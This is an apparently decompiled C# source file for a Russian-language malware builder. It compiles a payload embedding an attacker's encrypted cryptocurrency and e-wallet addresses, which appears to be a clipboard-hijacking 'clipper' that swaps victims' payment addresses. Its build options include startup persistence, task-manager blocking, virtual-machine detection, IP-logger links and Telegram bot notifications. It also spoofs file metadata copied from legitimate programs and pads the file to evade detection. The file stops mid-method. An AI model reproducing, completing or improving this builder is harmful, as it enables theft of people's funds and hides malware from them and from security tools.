using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.CSharp;

// Token: 0x02000027 RID: 39
public partial class Form1 : Form
{
	// Token: 0x060003BE RID: 958 RVA: 0x00009E90 File Offset: 0x00008090
	public Form1()
	{
		this.InitializeComponent();
		Form1.smethod_4(this.flatButton2, false);
		Form1.smethod_4(this.AntiTask, false);
		Form1.smethod_5(this.TitleName, Form1.smethod_2());
		Form1.smethod_5(this.DescriptionText, Form1.smethod_2());
		Form1.smethod_5(this.CompanyText, Form1.smethod_2());
		Form1.smethod_5(this.CopyrightText, Form1.smethod_2());
		Form1.smethod_5(this.VersionText, Form1.smethod_7("{0}.{1}.{2}.{3}", new object[]
		{
			Form1.smethod_6(Form1.random_0, 0, 9),
			Form1.smethod_6(Form1.random_0, 0, 9),
			Form1.smethod_6(Form1.random_0, 0, 9),
			Form1.smethod_6(Form1.random_0, 0, 9)
		}));
		Form1.smethod_5(this.Guid_Value, Guid.NewGuid().ToString());
		Form1.smethod_4(this.proxy, false);
		Form1.smethod_4(this.chatID, false);
		Form1.smethod_4(this.token, false);
		Form1.smethod_4(this.flatButton3, false);
	}

	// Token: 0x060003BF RID: 959 RVA: 0x00009FC0 File Offset: 0x000081C0
	public static bool smethod_0(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5 = null)
	{
		CompilerParameters compilerParameters = Form1.smethod_8();
		Form1.smethod_9(compilerParameters, true);
		Form1.smethod_10(compilerParameters, string_1);
		CompilerParameters compilerParameters_ = compilerParameters;
		StringBuilder stringBuilder = Form1.smethod_11();
		if (!Form1.smethod_12(string_4))
		{
			Form1.smethod_13(stringBuilder, " /define:{0} ", string_4);
		}
		string string_6 = "/optimize+ /platform:x86 /target:winexe /unsafe";
		if (string_5 != null)
		{
			string_6 = Form1.smethod_14(string_6, " /win32icon:\"", string_5, "\"");
		}
		string_6 = Form1.smethod_16(string_6, Form1.smethod_15(stringBuilder));
		Form1.smethod_17(compilerParameters_, string_6);
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.dll");
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.Windows.Forms.dll");
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.Management.dll");
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.Core.dll");
		if (string_3 != null)
		{
			Form1.smethod_19(Form1.smethod_20(compilerParameters_), string_3);
		}
		CompilerResults compilerResults_ = Form1.smethod_22(Form1.smethod_21(new Dictionary<string, string>
		{
			{
				"CompilerVersion",
				string_2
			}
		}), compilerParameters_, new string[]
		{
			string_0
		});
		if (Form1.smethod_24(Form1.smethod_23(compilerResults_)) > 0)
		{
			Form1.smethod_26(Form1.smethod_25("Имеются {0} ошибок", Form1.smethod_24(Form1.smethod_23(compilerResults_))), "Ошибка компиляции", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			IEnumerator enumerator = Form1.smethod_27(Form1.smethod_23(compilerResults_));
			try
			{
				while (Form1.smethod_32(enumerator))
				{
					CompilerError compilerError = (CompilerError)Form1.smethod_28(enumerator);
					Form1.smethod_31("Error_Compiler.txt", Form1.smethod_30("Ошибка: {0} \r\nСтрока: {1}\r\n", Form1.smethod_15(compilerError), Form1.smethod_29(compilerError)));
				}
			}
			finally
			{
				IDisposable disposable = enumerator as IDisposable;
				if (disposable != null)
				{
					Form1.smethod_33(disposable);
				}
			}
			return false;
		}
		return true;
	}

	// Token: 0x060003C0 RID: 960 RVA: 0x0000A160 File Offset: 0x00008360
	private void ChoiceIco_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = Form1.smethod_34();
		try
		{
			Form1.smethod_35(openFileDialog, "Выберите иконку");
			Form1.smethod_36(openFileDialog, ".ico|*.ico");
			if (Form1.smethod_37(openFileDialog) == DialogResult.OK)
			{
				Form1.smethod_5(this.IconTextBox, Form1.smethod_38(openFileDialog));
				Form1.smethod_39(this.pictureBox1, Form1.smethod_38(openFileDialog));
			}
		}
		finally
		{
			if (openFileDialog != null)
			{
				Form1.smethod_33(openFileDialog);
			}
		}
	}

	// Token: 0x060003C1 RID: 961 RVA: 0x0000A1D0 File Offset: 0x000083D0
	private string method_0(int int_0, bool bool_1)
	{
		Random random = Form1.smethod_40();
		string text = "դгжфֆйবբтзհֆխնйռցтդհўমցсрфўзтгйфবсবтўізռնжтխссհжз৯зৰжжгռз৯сзռдсд৯ցচցтітբзуռհіৰնৰтհрխіমуарпռзджնդ৯ৰ";
		if (bool_1)
		{
			text = Form1.smethod_16(text, "|Ä€Í÷×äđĐ[]íłŁ$ß¤<>#&@{}<;>*,.-");
		}
		string text2 = Form1.smethod_42(text, Form1.smethod_6(random, 10, Form1.smethod_41(text))).ToString();
		for (int i = 1; i < int_0; i++)
		{
			text2 += text[random.Next(text.Length)].ToString();
		}
		return text2;
	}

	// Token: 0x060003C2 RID: 962 RVA: 0x0000A248 File Offset: 0x00008448
	public static string smethod_1(string string_0, bool bool_1)
	{
		string string_ = "Prosto";
		byte[] array = Form1.smethod_44(Form1.smethod_43(), string_0);
		byte[] byte_;
		if (bool_1)
		{
			byte_ = Form1.smethod_46(Form1.smethod_45(), Form1.smethod_44(Form1.smethod_43(), string_));
		}
		else
		{
			byte_ = Form1.smethod_44(Form1.smethod_43(), string_);
		}
		TripleDESCryptoServiceProvider symmetricAlgorithm_ = Form1.smethod_47();
		Form1.smethod_48(symmetricAlgorithm_, byte_);
		Form1.smethod_49(symmetricAlgorithm_, CipherMode.ECB);
		Form1.smethod_50(symmetricAlgorithm_, PaddingMode.PKCS7);
		byte[] array2 = Form1.smethod_52(Form1.smethod_51(symmetricAlgorithm_), array, 0, array.Length);
		return Form1.smethod_53(array2, 0, array2.Length);
	}

	// Token: 0x060003C3 RID: 963 RVA: 0x000036E6 File Offset: 0x000018E6
	private static string smethod_2()
	{
		return Form1.smethod_55(Form1.smethod_54(), ".", "");
	}

	// Token: 0x060003C4 RID: 964 RVA: 0x0000A2C4 File Offset: 0x000084C4
	private void flatButton2_Click(object sender, EventArgs e)
	{
		bool flag = false;
		if (Form1.smethod_57(Form1.smethod_56(this.TitleName), "") || Form1.smethod_57(Form1.smethod_56(this.DescriptionText), "") || Form1.smethod_57(Form1.smethod_56(this.CompanyText), "") || Form1.smethod_57(Form1.smethod_56(this.VersionText), "") || Form1.smethod_57(Form1.smethod_56(this.Guid_Value), "") || Form1.smethod_57(Form1.smethod_56(this.CopyrightText), ""))
		{
			flag = true;
			Form1.smethod_26("Заполните данные в Описание файла или сгенирируйте случайные значения.", " Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		if (!flag)
		{
			SaveFileDialog saveFileDialog = Form1.smethod_58();
			try
			{
				Form1.smethod_59(saveFileDialog, Form1.smethod_2());
				Form1.smethod_36(saveFileDialog, "Приложение (.exe)|*.exe");
				if (Form1.smethod_60(saveFileDialog, this) == DialogResult.OK)
				{
					string string_ = Class2.String_1;
					string_ = Form1.smethod_55(string_, "[NameFile]", Form1.smethod_61(Form1.smethod_38(saveFileDialog)));
					string_ = Form1.smethod_55(string_, "[Title]", Form1.smethod_56(this.TitleName));
					string_ = Form1.smethod_55(string_, "[Description]", Form1.smethod_56(this.DescriptionText));
					string_ = Form1.smethod_55(string_, "[Company]", Form1.smethod_56(this.CompanyText));
					string_ = Form1.smethod_55(string_, "[Product]", Form1.smethod_56(this.TitleName));
					string_ = Form1.smethod_55(string_, "[Copyright]", Form1.smethod_56(this.CopyrightText));
					string_ = Form1.smethod_55(string_, "[Guid]", Form1.smethod_56(this.Guid_Value));
					string_ = Form1.smethod_55(string_, "[Version]", Form1.smethod_56(this.VersionText));
					string_ = Form1.smethod_55(string_, "[QIWI]", Form1.smethod_1(Form1.smethod_56(this.qiwi), true));
					string_ = Form1.smethod_55(string_, "[WMR]", Form1.smethod_1(Form1.smethod_56(this.wmr), true));
					string_ = Form1.smethod_55(string_, "[WMZ]", Form1.smethod_1(Form1.smethod_56(this.wmz), true));
					string_ = Form1.smethod_55(string_, "[YM]", Form1.smethod_1(Form1.smethod_56(this.ym), true));
					string_ = Form1.smethod_55(string_, "[BTC1]", Form1.smethod_1(Form1.smethod_56(this.BTC1), true));
					string_ = Form1.smethod_55(string_, "[BTC3]", Form1.smethod_1(Form1.smethod_56(this.BTC3), true));
					string_ = Form1.smethod_55(string_, "[ETH]", Form1.smethod_1(Form1.smethod_56(this.eth), true));
					string_ = Form1.smethod_55(string_, "[STEAM]", Form1.smethod_1(Form1.smethod_56(this.steam), true));
					string_ = Form1.smethod_55(string_, "[ZCASH]", Form1.smethod_1(Form1.smethod_56(this.zcash), true));
					string_ = Form1.smethod_55(string_, "[XPR]", Form1.smethod_1(Form1.smethod_56(this.xpr), true));
					string_ = Form1.smethod_55(string_, "[BCH]", Form1.smethod_1(Form1.smethod_56(this.bch), true));
					string_ = Form1.smethod_55(string_, "[BTG]", Form1.smethod_1(Form1.smethod_56(this.btg), true));
					string_ = Form1.smethod_55(string_, "[DASH]", Form1.smethod_1(Form1.smethod_56(this.dash), true));
					string_ = Form1.smethod_55(string_, "[DOGE]", Form1.smethod_1(Form1.smethod_56(this.doge), true));
					string_ = Form1.smethod_55(string_, "[LTC]", Form1.smethod_1(Form1.smethod_56(this.ltc), true));
					string_ = Form1.smethod_55(string_, "[NEO]", Form1.smethod_1(Form1.smethod_56(this.neo), true));
					string_ = Form1.smethod_55(string_, "[XLM]", Form1.smethod_1(Form1.smethod_56(this.xlm), true));
					string_ = Form1.smethod_55(string_, "[PAY]", Form1.smethod_1(Form1.smethod_56(this.pay), true));
					string_ = Form1.smethod_55(string_, "[TRX]", Form1.smethod_1(Form1.smethod_56(this.trx), true));
					string_ = Form1.smethod_55(string_, "[PPC]", Form1.smethod_1(Form1.smethod_56(this.PPC), true));
					string_ = Form1.smethod_55(string_, "[XMR]", Form1.smethod_1(Form1.smethod_56(this.XMR), true));
					string_ = Form1.smethod_55(string_, "[BCN]", Form1.smethod_1(Form1.smethod_56(this.BCN), true));
					string_ = Form1.smethod_55(string_, "[BNB]", Form1.smethod_1(Form1.smethod_56(this.BNB), true));
					string_ = Form1.smethod_55(string_, "[WMP]", Form1.smethod_1(Form1.smethod_56(this.WMP), true));
					string_ = Form1.smethod_55(string_, "[IP]", Form1.smethod_56(this.LinkLoggerTextBox));
					string_ = Form1.smethod_55(string_, "[IP2]", Form1.smethod_56(this.Logger));
					string_ = Form1.smethod_55(string_, "[TOKEN]", Form1.smethod_1(Form1.smethod_56(this.token), true));
					string_ = Form1.smethod_55(string_, "[CHATID]", Form1.smethod_1(Form1.smethod_56(this.chatID), true));
					string_ = Form1.smethod_55(string_, "[PROXY]", Form1.smethod_1(Form1.smethod_56(this.proxy), true));
					string_ = Form1.smethod_55(string_, "[user]", Form1.smethod_1(Form1.smethod_56(this.userp), true));
					string_ = Form1.smethod_55(string_, "[password]", Form1.smethod_1(Form1.smethod_56(this.passp), true));
					string text = "";
					if (this.flatCheckBox4.Boolean_0)
					{
						text = Form1.smethod_16(text, "TG;");
					}
					if (this.flatCheckBox5.Boolean_0)
					{
						text = Form1.smethod_16(text, "TGW;");
					}
					if (this.flatCheckBox2.Boolean_0)
					{
						text = Form1.smethod_16(text, "VM;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.LinkLoggerTextBox), ""))
					{
						text = Form1.smethod_16(text, "LOGGER;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.Logger), ""))
					{
						text = Form1.smethod_16(text, "LOGGER2;");
					}
					if (this.flatCheckBox3.Boolean_0)
					{
						text = Form1.smethod_16(text, "STARTUP;");
					}
					if (this.AntiTask.Boolean_0)
					{
						text = Form1.smethod_16(text, "AntiTask;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.BTC1), ""))
					{
						text = Form1.smethod_16(text, "BTC1;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.BTC3), ""))
					{
						text = Form1.smethod_16(text, "BTC3;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.qiwi), ""))
					{
						text = Form1.smethod_16(text, "QIWI;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.wmr), ""))
					{
						text = Form1.smethod_16(text, "WMR;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.wmz), ""))
					{
						text = Form1.smethod_16(text, "WMZ;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.ym), ""))
					{
						text = Form1.smethod_16(text, "YM;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.steam), ""))
					{
						text = Form1.smethod_16(text, "STEAM;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.eth), ""))
					{
						text = Form1.smethod_16(text, "ETH;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.pay), ""))
					{
						text = Form1.smethod_16(text, "PAY;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.neo), ""))
					{
						text = Form1.smethod_16(text, "NEO;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.zcash), ""))
					{
						text = Form1.smethod_16(text, "ZEC;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.XMR), ""))
					{
						text = Form1.smethod_16(text, "XMR;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.BCN), ""))
					{
						text = Form1.smethod_16(text, "BCN;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.btg), ""))
					{
						text = Form1.smethod_16(text, "BTG;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.xlm), ""))
					{
						text = Form1.smethod_16(text, "XLM;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.ltc), ""))
					{
						text = Form1.smethod_16(text, "LTC;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.bch), ""))
					{
						text = Form1.smethod_16(text, "BCH;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.xpr), ""))
					{
						text = Form1.smethod_16(text, "XPR;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.doge), ""))
					{
						text = Form1.smethod_16(text, "DOGE;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.dash), ""))
					{
						text = Form1.smethod_16(text, "DASH;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.trx), ""))
					{
						text = Form1.smethod_16(text, "TRX;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.PPC), ""))
					{
						text = Form1.smethod_16(text, "PPC;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.BNB), ""))
					{
						text = Form1.smethod_16(text, "BNB;");
					}
					if (Form1.smethod_62(Form1.smethod_56(this.WMP), ""))
					{
						text = Form1.smethod_16(text, "WMP;");
					}
					if (!Form1.smethod_62(Form1.smethod_56(this.IconTextBox), ""))
					{
						this.bool_0 = Form1.smethod_0(string_, Form1.smethod_38(saveFileDialog), "v4.0", null, text, null);
					}
					else
					{
						this.bool_0 = Form1.smethod_0(string_, Form1.smethod_38(saveFileDialog), "v4.0", null, text, Form1.smethod_56(this.IconTextBox));
					}
					Class0.smethod_0(Form1.smethod_38(saveFileDialog));
					if (this.flatNumeric1.Int64_0 > 0L)
					{
						this.method_1(Form1.smethod_38(saveFileDialog), (int)this.flatNumeric1.Int64_0, true);
					}
					Form1.smethod_26(Form1.smethod_16("Компиляция прошла успешно! Файл сохранен по пути: ", Form1.smethod_38(saveFileDialog)), " Успешно!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			finally
			{
				if (saveFileDialog != null)
				{
					Form1.smethod_33(saveFileDialog);
				}
			}
		}
	}

	// Token: 0x060003C5 RID: 965 RVA: 0x0000ACC0 File Offset: 0x00008EC0
	public void method_1(string string_0, int int_0, bool bool_1)
	{
		int_0 *= 1024;
		FileStream stream_ = Form1.smethod_63(string_0, FileMode.Append, FileAccess.Write);
		byte[] byte_ = new byte[int_0];
		if (bool_1)
		{
			Form1.smethod_64(Form1.smethod_40(), byte_);
		}
		Form1.smethod_65(stream_, byte_, 0, int_0);
		Form1.smethod_66(stream_);
	}

	// Token: 0x060003C6 RID: 966 RVA: 0x0000AD04 File Offset: 0x00008F04
	private void flatButton1_Click(object sender, EventArgs e)
	{
		Form1.smethod_5(this.TitleName, Form1.smethod_2());
		Form1.smethod_5(this.DescriptionText, Form1.smethod_2());
		Form1.smethod_5(this.CompanyText, Form1.smethod_2());
		Form1.smethod_5(this.CopyrightText, Form1.smethod_2());
		Form1.smethod_5(this.VersionText, Form1.smethod_7("{0}.{1}.{2}.{3}", new object[]
		{
			Form1.smethod_6(Form1.random_0, 0, 9),
			Form1.smethod_6(Form1.random_0, 0, 9),
			Form1.smethod_6(Form1.random_0, 0, 9),
			Form1.smethod_6(Form1.random_0, 0, 9)
		}));
		Form1.smethod_5(this.Guid_Value, Guid.NewGuid().ToString());
	}

	// Token: 0x060003C7 RID: 967 RVA: 0x000036FC File Offset: 0x000018FC
	private void method_2(object object_0)
	{
		Form1.smethod_4(this.flatButton2, this.flatCheckBox1.Boolean_0);
	}

	// Token: 0x060003C8 RID: 968 RVA: 0x0000ADE0 File Offset: 0x00008FE0
	private void flatButton5_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = Form1.smethod_34();
		Form1.smethod_36(openFileDialog, "Любой файл|*.*");
		OpenFileDialog openFileDialog2 = openFileDialog;
		if (Form1.smethod_37(openFileDialog2) == DialogResult.OK)
		{
			FileVersionInfo fileVersionInfo = Form1.smethod_67(Form1.smethod_38(openFileDialog2));
			Form1.smethod_5(this.CompanyText, Form1.smethod_68(fileVersionInfo));
			Form1.smethod_5(this.TitleName, Form1.smethod_69(fileVersionInfo));
			Form1.smethod_5(this.DescriptionText, Form1.smethod_69(fileVersionInfo));
			Form1.smethod_5(this.CopyrightText, Form1.smethod_70(fileVersionInfo));
			Form1.smethod_5(this.Guid_Value, Guid.NewGuid().ToString());
			this.VersionText.Text = string.Concat(new string[]
			{
				Form1.smethod_71(fileVersionInfo).ToString(),
				".",
				fileVersionInfo.FileMinorPart.ToString(),
				".",
				fileVersionInfo.FileBuildPart.ToString(),
				".0"
			});
		}
	}

	// Token: 0x060003C9 RID: 969 RVA: 0x00003714 File Offset: 0x00001914
	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060003CA RID: 970 RVA: 0x00003714 File Offset: 0x00001914
	private void method_3(object object_0)
	{
	}

	// Token: 0x060003CB RID: 971 RVA: 0x00003716 File Offset: 0x00001916
	private void method_4(object object_0)
	{
		if (this.flatCheckBox3.Boolean_0)
		{
			Form1.smethod_4(this.AntiTask, true);
			return;
		}
		Form1.smethod_4(this.AntiTask, false);
	}

	// Token: 0x060003CC RID: 972 RVA: 0x0000373E File Offset: 0x0000193E
	private void flatLabel4_Click(object sender, EventArgs e)
	{
		Form1.smethod_72("https://teleg.run/userinfobot");
	}

	// Token: 0x060003CD RID: 973 RVA: 0x0000AEDC File Offset: 0x000090DC
	private void flatButton3_Click(object sender, EventArgs e)
	{
		if (!Form1.smethod_57(Form1.smethod_56(this.chatID), "") && !Form1.smethod_57(Form1.smethod_56(this.token), "") && !Form1.smethod_57(Form1.smethod_56(this.proxy), ""))
		{
			try
			{
				Form1.smethod_3(Form1.smethod_56(this.chatID), Form1.smethod_56(this.token), Form1.smethod_56(this.proxy), Form1.smethod_56(this.userp), Form1.smethod_56(this.passp), "✅ Тестовое оповещение!");
			}
			catch (Exception object_)
			{
				Form1.smethod_26(Form1.smethod_73("Ошибка:", object_), " Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			return;
		}
		Form1.smethod_26("Все поля должны быть заполнены!", " Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
	}

	// Token: 0x060003CE RID: 974 RVA: 0x0000AFB8 File Offset: 0x000091B8
	private static void smethod_3(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5)
	{
		string string_6 = Form1.smethod_74("https://api.telegram.org/bot", string_1, "/sendMessage");
		WebClient webClient = Form1.smethod_75();
		try
		{
			if (Form1.smethod_62(string_2, ""))
			{
				WebProxy iwebProxy_ = Form1.smethod_76(string_2);
				Form1.smethod_77(webClient, iwebProxy_);
				Form1.smethod_79(webClient, Form1.smethod_78(string_3, string_4));
			}
			NameValueCollection nameValueCollection_ = Form1.smethod_80();
			Form1.smethod_81(nameValueCollection_, "parse_mode", "html");
			Form1.smethod_81(nameValueCollection_, "chat_id", string_0);
			Form1.smethod_81(nameValueCollection_, "text", string_5);
			byte[] byte_ = Form1.smethod_82(webClient, string_6, nameValueCollection_);
			Form1.smethod_26("Отправлено!", "Успешно!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			Form1.smethod_83(Form1.smethod_43(), byte_);
		}
		catch (Exception object_)
		{
			Form1.smethod_26(Form1.smethod_73("Ошибка:", object_), " Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		finally
		{
			if (webClient != null)
			{
				Form1.smethod_33(webClient);
			}
		}
	}

	// Token: 0x060003CF RID: 975 RVA: 0x0000B0A4 File Offset: 0x000092A4
	private void method_5(object object_0)
	{
		if (this.flatCheckBox4.Boolean_0)
		{
			Form1.smethod_4(this.proxy, true);
			Form1.smethod_4(this.chatID, true);
			Form1.smethod_4(this.token, true);
			Form1.smethod_4(this.flatButton3, true);
			Form1.smethod_4(this.userp, true);
			Form1.smethod_4(this.passp, true);
			return;
		}
		if (!this.flatCheckBox5.Boolean_0)
		{
			Form1.smethod_4(this.proxy, false);
			Form1.smethod_4(this.chatID, false);
			Form1.smethod_4(this.token, false);
			Form1.smethod_4(this.flatButton3, false);
			Form1.smethod_4(this.userp, false);
			Form1.smethod_4(this.passp, false);
		}
	}

	// Token: 0x060003D0 RID: 976 RVA: 0x0000B15C File Offset: 0x0000935C
	private void method_6(object object_0)
	{
		if (this.flatCheckBox5.Boolean_0)
		{
			Form1.smethod_4(this.proxy, true);
			Form1.smethod_4(this.chatID, true);
			Form1.smethod_4(this.token, true);
			Form1.smethod_4(this.flatButton3, true);
			Form1.smethod_4(this.userp, true);
			Form1.smethod_4(this.passp, true);
			return;
		}
		if (!this.flatCheckBox4.Boolean_0)
		{
			Form1.smethod_4(this.proxy, false);
			Form1.smethod_4(this.chatID, false);
			Form1.smethod_4(this.token, false);
			Form1.smethod_4(this.flatButton3, false);
			Form1.smethod_4(this.userp, false);
			Form1.smethod_4(this.passp, false);
		}
	}

	// Token: 0x060003D1 RID: 977 RVA: 0x00003714 File Offset: 0x00001914
	private void passp_TextChanged(object sender, EventArgs e)
	{
	}

	// Token: 0x060003D2 RID: 978 RVA: 0x0000374B File Offset: 0x0000194B
	private void flatLabel3_Click(object sender, EventArgs e)
	{
		Form1.smethod_72("https://teleg.run/botfather");
	}

	// Token: 0x060003D3 RID: 979 RVA: 0x00003758 File Offset: 0x00001958
	private void method_7(object sender, EventArgs e)
	{
		Form1.smethod_72("https://teleg.run/ProstoCoder");
	}

	// Token: 0x060003D4 RID: 980 RVA: 0x00003765 File Offset: 0x00001965
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		while (Form1.smethod_84(this) > 0.0)
		{
			Form1.smethod_85(this, Form1.smethod_84(this) - 0.01);
			Form1.smethod_86(10);
		}
	}

	// Token: 0x060003D5 RID: 981 RVA: 0x00003765 File Offset: 0x00001965
	private void flatClose1_Click(object sender, EventArgs e)
	{
		while (Form1.smethod_84(this) > 0.0)
		{
			Form1.smethod_85(this, Form1.smethod_84(this) - 0.01);
			Form1.smethod_86(10);
		}
	}

	// Token: 0x060003D6 RID: 982 RVA: 0x0000B214 File Offset: 0x00009414
	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_87((Control)sender);
		Form1.smethod_85(this, 0.0);
		while (Form1.smethod_84(this) < 1.0)
		{
			Form1.smethod_85(this, Form1.smethod_84(this) + 0.01);
			Form1.smethod_86(10);
		}
	}

	// Token: 0x060003D7 RID: 983 RVA: 0x0000B214 File Offset: 0x00009414
	private void formSkin1_Click(object sender, EventArgs e)
	{
		Form1.smethod_87((Control)sender);
		Form1.smethod_85(this, 0.0);
		while (Form1.smethod_84(this) < 1.0)
		{
			Form1.smethod_85(this, Form1.smethod_84(this) + 0.01);
			Form1.smethod_86(10);
		}
	}

	// Token: 0x060003D8 RID: 984 RVA: 0x00003798 File Offset: 0x00001998
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			Form1.smethod_33(this.icontainer_0);
		}
		base.Dispose(disposing);
	}

	// Token: 0x060003DB RID: 987 RVA: 0x000037C3 File Offset: 0x000019C3
	static void smethod_4(Control control_0, bool bool_1)
	{
		control_0.Enabled = bool_1;
	}

	// Token: 0x060003DC RID: 988 RVA: 0x00002340 File Offset: 0x00000540
	static void smethod_5(Control control_0, string string_0)
	{
		control_0.Text = string_0;
	}

	// Token: 0x060003DD RID: 989 RVA: 0x000037CC File Offset: 0x000019CC
	static int smethod_6(Random random_1, int int_0, int int_1)
	{
		return random_1.Next(int_0, int_1);
	}

	// Token: 0x060003DE RID: 990 RVA: 0x000037D6 File Offset: 0x000019D6
	static string smethod_7(string string_0, object[] object_0)
	{
		return string.Format(string_0, object_0);
	}

	// Token: 0x060003DF RID: 991 RVA: 0x000037DF File Offset: 0x000019DF
	static CompilerParameters smethod_8()
	{
		return new CompilerParameters();
	}

	// Token: 0x060003E0 RID: 992 RVA: 0x000037E6 File Offset: 0x000019E6
	static void smethod_9(CompilerParameters compilerParameters_0, bool bool_1)
	{
		compilerParameters_0.GenerateExecutable = bool_1;
	}

	// Token: 0x060003E1 RID: 993 RVA: 0x000037EF File Offset: 0x000019EF
	static void smethod_10(CompilerParameters compilerParameters_0, string string_0)
	{
		compilerParameters_0.OutputAssembly = string_0;
	}

	// Token: 0x060003E2 RID: 994 RVA: 0x000037F8 File Offset: 0x000019F8
	static StringBuilder smethod_11()
	{
		return new StringBuilder();
	}

	// Token: 0x060003E3 RID: 995 RVA: 0x000037FF File Offset: 0x000019FF
	static bool smethod_12(string string_0)
	{
		return string.IsNullOrEmpty(string_0);
	}

	// Token: 0x060003E4 RID: 996 RVA: 0x00003807 File Offset: 0x00001A07
	static StringBuilder smethod_13(StringBuilder stringBuilder_0, string string_0, object object_0)
	{
		return stringBuilder_0.AppendFormat(string_0, object_0);
	}

	// Token: 0x060003E5 RID: 997 RVA: 0x00003811 File Offset: 0x00001A11
	static string smethod_14(string string_0, string string_1, string string_2, string string_3)
	{
		return string_0 + string_1 + string_2 + string_3;
	}

	// Token: 0x060003E6 RID: 998 RVA: 0x00002128 File Offset: 0x00000328
	static string smethod_15(object object_0)
	{
		return object_0.ToString();
	}

	// Token: 0x060003E7 RID: 999 RVA: 0x0000207A File Offset: 0x0000027A
	static string smethod_16(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	// Token: 0x060003E8 RID: 1000 RVA: 0x0000381C File Offset: 0x00001A1C
	static void smethod_17(CompilerParameters compilerParameters_0, string string_0)
	{
		compilerParameters_0.CompilerOptions = string_0;
	}

	// Token: 0x060003E9 RID: 1001 RVA: 0x00003825 File Offset: 0x00001A25
	static StringCollection smethod_18(CompilerParameters compilerParameters_0)
	{
		return compilerParameters_0.ReferencedAssemblies;
	}

	// Token: 0x060003EA RID: 1002 RVA: 0x0000382D File Offset: 0x00001A2D
	static int smethod_19(StringCollection stringCollection_0, string string_0)
	{
		return stringCollection_0.Add(string_0);
	}

	// Token: 0x060003EB RID: 1003 RVA: 0x00003836 File Offset: 0x00001A36
	static StringCollection smethod_20(CompilerParameters compilerParameters_0)
	{
		return compilerParameters_0.EmbeddedResources;
	}

	// Token: 0x060003EC RID: 1004 RVA: 0x0000383E File Offset: 0x00001A3E
	static CSharpCodeProvider smethod_21(IDictionary<string, string> idictionary_0)
	{
		return new CSharpCodeProvider(idictionary_0);
	}

	// Token: 0x060003ED RID: 1005 RVA: 0x00003846 File Offset: 0x00001A46
	static CompilerResults smethod_22(CodeDomProvider codeDomProvider_0, CompilerParameters compilerParameters_0, string[] string_0)
	{
		return codeDomProvider_0.CompileAssemblyFromSource(compilerParameters_0, string_0);
	}

	// Token: 0x060003EE RID: 1006 RVA: 0x00003850 File Offset: 0x00001A50
	static CompilerErrorCollection smethod_23(CompilerResults compilerResults_0)
	{
		return compilerResults_0.Errors;
	}

	// Token: 0x060003EF RID: 1007 RVA: 0x00003858 File Offset: 0x00001A58
	static int smethod_24(CollectionBase collectionBase_0)
	{
		return collectionBase_0.Count;
	}

	// Token: 0x060003F0 RID: 1008 RVA: 0x00003860 File Offset: 0x00001A60
	static string smethod_25(string string_0, object object_0)
	{
		return string.Format(string_0, object_0);
	}

	// Token: 0x060003F1 RID: 1009 RVA: 0x00003869 File Offset: 0x00001A69
	static DialogResult smethod_26(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	// Token: 0x060003F2 RID: 1010 RVA: 0x00003874 File Offset: 0x00001A74
	static IEnumerator smethod_27(CollectionBase collectionBase_0)
	{
		return collectionBase_0.GetEnumerator();
	}

	// Token: 0x060003F3 RID: 1011 RVA: 0x00002FCF File Offset: 0x000011CF
	static object smethod_28(IEnumerator ienumerator_0)
	{
		return ienumerator_0.Current;
	}

	// Token: 0x060003F4 RID: 1012 RVA: 0x0000387C File Offset: 0x00001A7C
	static int smethod_29(CompilerError compilerError_0)
	{
		return compilerError_0.Line;
	}

	// Token: 0x060003F5 RID: 1013 RVA: 0x00003884 File Offset: 0x00001A84
